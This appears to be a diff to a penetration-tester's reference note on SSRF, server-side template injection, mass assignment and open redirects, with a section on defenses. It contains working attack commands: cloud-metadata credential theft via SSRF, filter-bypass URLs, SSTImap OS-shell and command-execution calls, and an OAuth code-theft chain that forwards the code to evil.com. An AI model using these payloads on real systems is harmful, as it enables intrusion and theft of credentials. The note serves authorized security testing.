@@ -14,19 +14,39 @@ Server-side vulnerabilities where attacker-controlled input is processed by the 
 
 | Tool | Purpose |
 |---|---|
-| `Burp Suite` | Intercept and modify requests, Collaborator for OOB SSRF callbacks |
-| `interactsh-client` | OOB interaction detection for blind SSRF — `go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest` |
-| `tplmap` | Automated SSTI detection and exploitation — `git clone https://github.com/epinna/tplmap` |
-| `SSTImap` | Actively maintained tplmap fork — `git clone https://github.com/vladko312/SSTImap` |
-| `SSRFmap` | Automated SSRF exploitation with internal service probing — `git clone https://github.com/swisskyrepo/SSRFmap` |
-| `Gopherus` | Generates gopher:// payloads for Redis, MySQL, FastCGI, SMTP — `git clone https://github.com/tarunkant/Gopherus` |
-| `curl` | Manual SSRF probing, redirect tracing (`-L`), header inspection |
+| [[Tools/Web/Burpsuite\|Burp Suite]] | Intercept and modify requests; Collaborator for OOB SSRF callbacks |
+| [[Tools/File Transfer/cURL\|curl]] | Manual SSRF probing, redirect tracing (`-L`), header inspection |
+| [interactsh-client](https://github.com/projectdiscovery/interactsh) | OOB interaction detection for blind SSRF — `go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest` |
+| [SSTImap](https://github.com/vladko312/SSTImap) | Automated SSTI detection and exploitation — maintained fork of tplmap |
+| [tplmap](https://github.com/epinna/tplmap) | The original SSTI tool — **unmaintained since 2021, Python 2**; use SSTImap instead |
+| [SSRFmap](https://github.com/swisskyrepo/SSRFmap) | Automated SSRF exploitation with internal service probing |
+| [Gopherus](https://github.com/tarunkant/Gopherus) | Generates `gopher://` payloads for Redis, MySQL, FastCGI, SMTP — **Python 2, unmaintained** |
+
+> [!warning]
+> Both `tplmap` and `Gopherus` are Python 2 and long unmaintained. On a modern Kali there's no `python2` by default — either run them in a container, or generate gopher payloads by hand (the Redis/FastCGI formats are simple enough to build from the raw protocol).
 
 ---
 
 ## SSRF (Server-Side Request Forgery)
 
 Server makes HTTP requests to attacker-controlled destinations. Used to reach internal services, cloud metadata, or chain to RCE.
+
+The value is **positional** — the server is inside the trust boundary you aren't:
+
+```mermaid
+flowchart LR
+    Atk["Attacker<br/>controls url= param"] --> Srv["Vulnerable server<br/>fetches it for you"]
+    Srv --> Zone
+    subgraph Zone["Reachable only from the server"]
+        direction TB
+        Meta["Cloud metadata<br/>169.254.169.254"]
+        Intn["Internal apps / admin<br/>127.0.0.1 and RFC1918"]
+        Files["Local files<br/>file:///etc/passwd"]
+        Svc["Non-HTTP services<br/>Redis, SMTP, FastCGI via gopher"]
+    end
+    Meta --> Creds["IAM credentials"]
+    Svc --> RCE["RCE"]
+```
 
 ### Identify SSRF
 
@@ -82,11 +102,20 @@ curl -s "http://<target>/fetch?url=http://169.254.169.254/latest/meta-data/iam/s
 curl -s "http://<target>/fetch?url=http://169.254.169.254/latest/user-data"
 # Returns: AccessKeyId, SecretAccessKey, Token — use with aws cli
 
-# AWS IMDSv2 (requires token — try v1 first)
-# Step 1: the token endpoint is a PUT — a plain GET-only SSRF sink CANNOT reach it,
-# which is the whole point of IMDSv2. Only works if the sink lets you set method+headers:
-curl -s -X PUT "http://<target>/fetch?url=http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
-# Alternate: send a raw PUT via Gopher (see below)
+# AWS IMDSv2 — usually NOT reachable via SSRF, by design.
+# The token endpoint requires PUT + a custom header. A typical SSRF sink issues a
+# plain GET with no attacker-controlled headers, so it simply cannot mint a token.
+#
+# NOTE: -X PUT below sets the method on YOUR request to <target>, NOT on the
+# server-side request to 169.254.169.254. It only helps if the sink proxies your
+# method and headers through — rare. Confirm before assuming it works.
+curl -s -X PUT "http://<target>/fetch?url=http://169.254.169.254/latest/api/token" \
+  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+#
+# Realistic paths to IMDSv2:
+#   - gopher:// — craft the raw PUT + header bytes yourself (needs a gopher-capable sink)
+#   - A full HTTP-proxy SSRF that forwards method and headers verbatim
+#   - IMDSv1 still enabled (very common on older instances) — always try v1 first
 
 # Azure IMDS
 curl -s "http://<target>/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata: true"
@@ -109,9 +138,15 @@ curl -s "http://<target>/fetch?url=http://127.1/"            # short form
 curl -s "http://<target>/fetch?url=http://[::1]/"            # IPv6 loopback
 curl -s "http://<target>/fetch?url=http://[::]/"             # IPv6 any
 
-# DNS rebinding / redirect bypass — use a domain you control that resolves to 127.0.0.1
-# nip.io / xip.io style:
+# Attacker-controlled DNS resolving to a blocked address — beats a STRING blacklist
+# (this is NOT DNS rebinding; the name resolves to 127.0.0.1 every time)
 curl -s "http://<target>/fetch?url=http://127.0.0.1.nip.io/"
+
+# TRUE DNS rebinding — beats a resolve-then-check filter (TOCTOU)
+# Your DNS server answers with a public IP on the 1st lookup (passes validation),
+# then 127.0.0.1 on the 2nd lookup (the request the server actually makes).
+# Needs a short TTL and a target that resolves twice — use rbndr.us or a custom zone.
+curl -s "http://<target>/fetch?url=http://7f000001.c0a80001.rbndr.us/"
 
 # URL confusion
 curl -s "http://<target>/fetch?url=http://attacker.com@127.0.0.1/"
@@ -207,15 +242,26 @@ curl -s "http://<target>/page?name=<%= 7*7 %>"   # ERB/EJS → 49
 curl -s "http://<target>/page?name=#{7*7}"        # Ruby/Slim interpolation → 49
 curl -s "http://<target>/page?name={{7*'7'}}"     # Jinja2 → 7777777, Twig → 49
 
-# Engine fingerprint decision tree:
-# {{7*7}} → 49        = Twig (PHP) or Jinja2 (Python)
-# {{7*'7'}} → 7777777 = Jinja2
-# {{7*'7'}} → 49      = Twig
-# ${7*7} → 49         = Freemarker (Java) or Mako (Python)
-# *{7*7} → 49         = Spring (Java / Thymeleaf)
-
 # Test everywhere — not just URL params
 # Headers, cookies, form fields, JSON values, email name/subject fields
+```
+
+**Engine fingerprint — work the tree:**
+
+```mermaid
+flowchart TD
+    A["Inject {{7*7}}"] --> B{"Renders 49?"}
+    B -->|"No"| C["Inject ${7*7}"]
+    C --> D{"Renders 49?"}
+    D -->|"Yes"| E["Freemarker or Mako"]
+    D -->|"No"| F["Inject *{7*7}"]
+    F --> G{"Renders 49?"}
+    G -->|"Yes"| H["Spring / Thymeleaf"]
+    G -->|"No"| I["Try ERB / EJS percent-equals syntax<br/>else probably not SSTI"]
+    B -->|"Yes"| J["Inject {{7*'7'}}"]
+    J --> K{"Result?"}
+    K -->|"7777777"| L["Jinja2 (Python)"]
+    K -->|"49"| M["Twig (PHP)"]
 ```
 
 ### Jinja2 (Python — Flask/Django)
@@ -317,21 +363,32 @@ $ex.waitFor()
 git clone https://github.com/vladko312/SSTImap
 cd SSTImap && pip3 install -r requirements.txt
 
-# Auto-detect engine and test
+# Auto-detect engine and test — * marks the injection point
 python3 sstimap.py -u "http://<target>/page?name=*"
 
-# Interactive shell
+# Interactive OS shell
 python3 sstimap.py -u "http://<target>/page?name=*" --os-shell
 
-# Run single command  (confirm the flag with `sstimap.py -h` — builds vary; some use --os-cmd)
-python3 sstimap.py -u "http://<target>/page?name=*" -c "id"
+# Run a single command
+python3 sstimap.py -u "http://<target>/page?name=*" --os-cmd "id"
 
 # POST parameter
 python3 sstimap.py -u "http://<target>/greet" -d "name=*"
 
-# With cookies
-python3 sstimap.py -u "http://<target>/page?name=*" -c "id" --cookie "session=<value>"
+# Authenticated — -c is the COOKIE flag (inherited from tplmap)
+python3 sstimap.py -u "http://<target>/page?name=*" --os-cmd "id" -c "session=<value>"
 ```
+
+| Flag | Meaning |
+|---|---|
+| `-u` / `-d` | Target URL / POST data; `*` marks the injection point |
+| `--os-cmd` | Execute one OS command |
+| `--os-shell` | Interactive shell |
+| `-c` | **Cookies** — *not* command execution |
+| `-e` | Force a specific template engine, skipping detection |
+
+> [!warning]
+> `-c` is **cookies**, not command. Passing `-c "id"` doesn't run anything — it sends a malformed cookie and silently does nothing useful. Command execution is `--os-cmd`.
 
 ---
 
@@ -441,10 +498,20 @@ curl -s "http://<target>/redirect?url=javascript:alert(1)"
 # Send victim: https://target.com/redirect?url=https://evil.com/fake-login
 # Victim sees legitimate domain in URL bar before redirect
 
-# 2. Open redirect → OAuth token theft
-# If OAuth callback uses redirect_uri:
-# https://target.com/oauth/callback?code=<code>&redirect_uri=https://target.com/redirect?url=https://evil.com
-# → OAuth redirects code to your server via the open redirect
+# 2. Open redirect → OAuth code theft
+# The redirect_uri goes on the AUTHORIZATION request, not the callback.
+# Providers validate redirect_uri against a registered allowlist — an open redirect
+# ON an allowlisted host satisfies that check, then bounces the code onward.
+#
+#   https://idp.com/authorize
+#     ?client_id=<id>
+#     &response_type=code
+#     &redirect_uri=https://target.com/redirect%3Furl%3Dhttps://evil.com
+#
+# Victim authenticates -> IdP 302s to target.com/redirect?url=... with ?code=<code>
+# -> the open redirect forwards to evil.com, carrying the code in the query string
+# (or in the Referer, if the hop is client-side).
+# Then exchange it: POST /token with code + client_id. See [[OAuth-OIDC-SAML]].
 
 # 3. Open redirect → SSRF
 # Some apps validate redirect URL then make server-side request to it
@@ -454,6 +521,30 @@ curl -s "http://<target>/redirect?url=javascript:alert(1)"
 # 4. Open redirect + CSRF — force victim to authenticated action
 # Embed in phish email: link to open redirect → page that triggers CSRF
 ```
+
+---
+
+## Prevention (Know the Defenses)
+
+What you're up against per class, and where each control still leaks — useful for the remediation section of a report.
+
+| Class | Control | Residual gap |
+|---|---|---|
+| **SSRF** | Allowlist destination hosts | The only control that really works. A *blocklist* loses to decimal/octal/IPv6 encodings, `nip.io`, and redirects |
+| **SSRF** | Validate the URL, then fetch | Classic TOCTOU — DNS rebinding re-resolves between check and fetch. Resolve **once** and connect to that IP |
+| **SSRF** | Block link-local `169.254.0.0/16` | Misses internal RFC1918 ranges and `file://`/`gopher://` sinks |
+| **SSRF** | Disable unused URL schemes | Leaving `gopher://` enabled is what turns SSRF into RCE |
+| **SSRF** | IMDSv2 (session tokens) | Only helps if IMDSv1 is actually *disabled* — it stays enabled by default on older instances. Also set the hop limit to 1 |
+| **SSTI** | Never concatenate user input into a template | The actual fix. Pass it as a **context variable**, not template source |
+| **SSTI** | Sandboxed engine | Sandboxes get escaped routinely — a delay, not a boundary |
+| **SSTI** | Logic-less templates (Mustache) | Removes the RCE primitive entirely, at a feature cost |
+| **Mass assignment** | Explicit allowlist binding (strong params, `$fillable`, DTOs) | A `permit!` / `$guarded = []` / `{...req.body}` escape hatch reopens it |
+| **Mass assignment** | Server-side authorization on every field | Binding `role` is only a finding if nothing re-checks who may set it |
+| **Open redirect** | Relative paths only, or an allowlist | Substring/prefix checks lose to `target.com.evil.com`, `@`, `//`, and Unicode dots |
+| **Open redirect** | Exact-match `redirect_uri` at the IdP | An open redirect on an allowlisted host defeats the allowlist |
+
+> [!warning]
+> SSRF blocklists are the single most common failed remediation. If a report says "we block 169.254.169.254", retest with `2130706433`, `[::1]`, `127.0.0.1.nip.io`, and an attacker-hosted 302 — at least one usually still lands.
 
 ---
 
@@ -482,5 +573,5 @@ curl -sv "http://<target>/redirect?url=https://example.com" 2>&1 | grep -i "^< l
 ---
 
 *Created: 2026-03-04*
-*Updated: 2026-07-21*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-18*
+*Model: claude-opus-5*
